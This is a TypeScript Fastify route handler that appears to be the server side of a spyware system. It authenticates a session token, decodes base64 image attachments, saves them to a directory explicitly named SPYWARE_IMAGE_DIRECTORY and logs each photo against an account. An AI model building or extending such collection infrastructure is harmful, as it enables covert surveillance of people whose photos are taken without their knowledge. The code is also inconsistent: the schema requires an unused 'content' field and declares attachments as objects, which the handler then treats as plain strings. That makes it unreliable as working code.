import path from 'path';
import * as fs from 'fs';

import { FastifyReply, FastifyRequest } from 'fastify';
import { PrismaClient } from '@prisma/client';
import { tryFindAccountBySessionToken } from '../../utils/tryFindAccountBySessionToken';
import { SPYWARE_IMAGE_DIRECTORY } from '../../const';
import { tryGetFileImageExtension } from '../../utils/tryGetFileImageExtension';

async function _storeAttachment(attachmentID: number, attachment: object) {
    const pictureAsEncoded = attachment as unknown as string;
    const pictureExtension = tryGetFileImageExtension(pictureAsEncoded);
    if (pictureExtension == undefined) {
        return false;
    }

    const targetFilePath = path.join(SPYWARE_IMAGE_DIRECTORY, `pl_${attachmentID}.` + pictureExtension);

    // Define the target file path
    const buffer = Buffer.from(pictureAsEncoded, 'base64');
    await fs.promises.writeFile(targetFilePath, buffer);
    return true;
}

async function _tryStoreAttachments(prismaConnection: PrismaClient, accountID: number, attachments: object[]) {
    await fs.promises.mkdir(SPYWARE_IMAGE_DIRECTORY, { recursive: true });

    const attachmentPromises = attachments.map(async (attachment) => {
        const newAttachmentStore = await prismaConnection.photoLog.create({
            data: {
                account_id: accountID,
                timestamp: new Date()
            }
        });

        return {
            status: await _storeAttachment(newAttachmentStore.id, attachment),
            attachmentID: newAttachmentStore.id
        }
    });

    return await Promise.all(attachmentPromises);
}

export const logFile = async (request: FastifyRequest, reply: FastifyReply) => {
    const prisma = new PrismaClient();

    try {
        const { auth_token, attachments } = request.body as { 
            auth_token: string;
            attachments: object | object[];
        };
        const account = await tryFindAccountBySessionToken(auth_token, prisma);
        if (!account) {
            return reply.status(200).send({ status: "BAD_AUTH" });
        }

        const attachmentArray = Array.isArray(attachments) ? attachments : [attachments];
        await _tryStoreAttachments(prisma, account.id, attachmentArray);

        reply.status(200).send({ status: "SUCCESS" });
    } catch (error) {
        console.error("Error:", error);
        reply.status(500).send({ status: "FAILURE" });
    } finally {
        await prisma.$disconnect();
    }
};


export const logFileSchema = {
    body: {
        type: 'object',
        required: ['attachments', 'content'],
        properties: {
            attachments: {
                type: 'array',
                items: {
                    type: 'object',
                    properties: {
                        filename: { type: 'string' },
                        data: { type: 'string' }
                    },
                    required: ['filename', 'data']
                }
            },
            auth_token: {
                type: 'string'
            }
        }
    }
};
